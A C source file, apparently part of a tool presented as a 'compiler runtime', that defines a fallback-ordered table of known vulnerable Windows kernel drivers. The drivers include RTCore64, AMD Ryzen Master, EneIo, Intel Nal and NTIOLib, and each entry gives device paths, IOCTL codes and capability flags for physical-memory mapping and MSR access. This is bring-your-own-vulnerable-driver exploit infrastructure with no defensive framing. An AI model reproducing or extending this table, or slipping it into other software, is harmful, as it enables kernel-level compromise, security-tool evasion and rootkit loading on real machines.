/*
 * BYOVD Driver Manifest Implementation
 * JOCKY Compiler Runtime
 */

#include "byovd_manifest.h"

/* Driver registry - ordered by fallback priority */
const struct byovd_driver_info g_byovd_drivers[] = {
    {
        .name = "rtkiow10x64.sys",
        .device_path = "\\\\.\\RTCore64",
        .map_ioctl = BYOVD_IOCTL_MAP_PHYS,
        .unmap_ioctl = BYOVD_IOCTL_UNMAP_PHYS,
        .read_msr_ioctl = BYOVD_IOCTL_READ_MSR,
        .write_msr_ioctl = BYOVD_IOCTL_WRITE_MSR,
        .capabilities = BYOVD_CAP_PHYS_READ | BYOVD_CAP_PHYS_WRITE |
                        BYOVD_CAP_MSR_READ | BYOVD_CAP_MSR_WRITE |
                        BYOVD_CAP_PORT_READ | BYOVD_CAP_PORT_WRITE,
        .requires_amd_cpu = 0,
        .requires_intel_nic = 0,
        .requires_nvidia_gpu = 0
    },
    {
        .name = "rtkiow8x64.sys",
        .device_path = "\\\\.\\RTCore64",
        .map_ioctl = BYOVD_IOCTL_MAP_PHYS,
        .unmap_ioctl = BYOVD_IOCTL_UNMAP_PHYS,
        .read_msr_ioctl = BYOVD_IOCTL_READ_MSR,
        .write_msr_ioctl = BYOVD_IOCTL_WRITE_MSR,
        .capabilities = BYOVD_CAP_PHYS_READ | BYOVD_CAP_PHYS_WRITE |
                        BYOVD_CAP_MSR_READ | BYOVD_CAP_PORT_READ,
        .requires_amd_cpu = 0,
        .requires_intel_nic = 0,
        .requires_nvidia_gpu = 0
    },
    {
        .name = "AMDRyzenMasterDriver.sys",
        .device_path = "\\\\.\\AMDRyzenMasterDriver",
        .map_ioctl = BYOVD_AMD_IOCTL_MAP_PHYS,
        .unmap_ioctl = BYOVD_AMD_IOCTL_UNMAP_PHYS,
        .read_msr_ioctl = BYOVD_AMD_IOCTL_READ_MSR,
        .write_msr_ioctl = BYOVD_AMD_IOCTL_WRITE_MSR,
        .capabilities = BYOVD_CAP_PHYS_READ | BYOVD_CAP_PHYS_WRITE |
                        BYOVD_CAP_MSR_READ | BYOVD_CAP_MSR_WRITE |
                        BYOVD_CAP_PCI_READ | BYOVD_CAP_PCI_WRITE,
        .requires_amd_cpu = 1,
        .requires_intel_nic = 0,
        .requires_nvidia_gpu = 0
    },
    {
        .name = "nvflsh64.sys",
        .device_path = "\\\\.\\nvflsh64",
        .map_ioctl = BYOVD_GEN_IOCTL_MAP_PHYS,
        .unmap_ioctl = BYOVD_GEN_IOCTL_UNMAP_PHYS,
        .read_msr_ioctl = 0,  /* No MSR in this driver */
        .write_msr_ioctl = 0,
        .capabilities = BYOVD_CAP_PHYS_READ | BYOVD_CAP_PHYS_WRITE |
                        BYOVD_CAP_PORT_READ | BYOVD_CAP_PORT_WRITE,
        .requires_amd_cpu = 0,
        .requires_intel_nic = 0,
        .requires_nvidia_gpu = 1
    },
    {
        .name = "speedfan.sys",
        .device_path = "\\\\.\\speedfan",
        .map_ioctl = BYOVD_GEN_IOCTL_MAP_PHYS,
        .unmap_ioctl = BYOVD_GEN_IOCTL_UNMAP_PHYS,
        .read_msr_ioctl = BYOVD_GEN_IOCTL_READ_MSR,
        .write_msr_ioctl = 0,
        .capabilities = BYOVD_CAP_PHYS_READ | BYOVD_CAP_PHYS_WRITE |
                        BYOVD_CAP_MSR_READ | BYOVD_CAP_PORT_READ,
        .requires_amd_cpu = 0,
        .requires_intel_nic = 0,
        .requires_nvidia_gpu = 0
    },
    {
        .name = "ene.sys",
        .device_path = "\\\\.\\EneIo",
        .map_ioctl = BYOVD_ENE_IOCTL_MAP_PHYS,
        .unmap_ioctl = BYOVD_ENE_IOCTL_UNMAP_PHYS,
        .read_msr_ioctl = 0,
        .write_msr_ioctl = 0,
        .capabilities = BYOVD_CAP_PHYS_READ | BYOVD_CAP_PHYS_WRITE |
                        BYOVD_CAP_PORT_READ,
        .requires_amd_cpu = 0,
        .requires_intel_nic = 0,
        .requires_nvidia_gpu = 0
    },
    {
        .name = "iQVW64.SYS",
        .device_path = "\\\\.\\Nal",
        .map_ioctl = 0x80802000,
        .unmap_ioctl = 0x80802004,
        .read_msr_ioctl = 0,
        .write_msr_ioctl = 0,
        .capabilities = BYOVD_CAP_PHYS_READ | BYOVD_CAP_PHYS_WRITE |
                        BYOVD_CAP_MMIO_READ | BYOVD_CAP_MMIO_WRITE,
        .requires_amd_cpu = 0,
        .requires_intel_nic = 1,
        .requires_nvidia_gpu = 0
    },
    {
        .name = "UCOREW64.SYS",
        .device_path = "\\\\.\\Global\\",
        .map_ioctl = 0x88000000,
        .unmap_ioctl = 0x88000004,
        .read_msr_ioctl = 0,
        .write_msr_ioctl = 0,
        .capabilities = BYOVD_CAP_PHYS_READ | BYOVD_CAP_PHYS_WRITE |
                        BYOVD_CAP_PORT_READ | BYOVD_CAP_PORT_WRITE |
                        BYOVD_CAP_MMIO_READ | BYOVD_CAP_MMIO_WRITE,
        .requires_amd_cpu = 0,
        .requires_intel_nic = 0,
        .requires_nvidia_gpu = 0
    },
    {
        .name = "NTIOLib.sys",
        .device_path = "\\\\.\\NTIOLib",
        .map_ioctl = BYOVD_MSI_IOCTL_MAP_PHYS,
        .unmap_ioctl = BYOVD_MSI_IOCTL_UNMAP_PHYS,
        .read_msr_ioctl = 0x84002008,
        .write_msr_ioctl = 0,
        .capabilities = BYOVD_CAP_PHYS_READ | BYOVD_CAP_PHYS_WRITE |
                        BYOVD_CAP_MSR_READ | BYOVD_CAP_PORT_READ,
        .requires_amd_cpu = 0,
        .requires_intel_nic = 0,
        .requires_nvidia_gpu = 0
    }
};

const int g_byovd_driver_count = sizeof(g_byovd_drivers) / sizeof(g_byovd_drivers[0]);
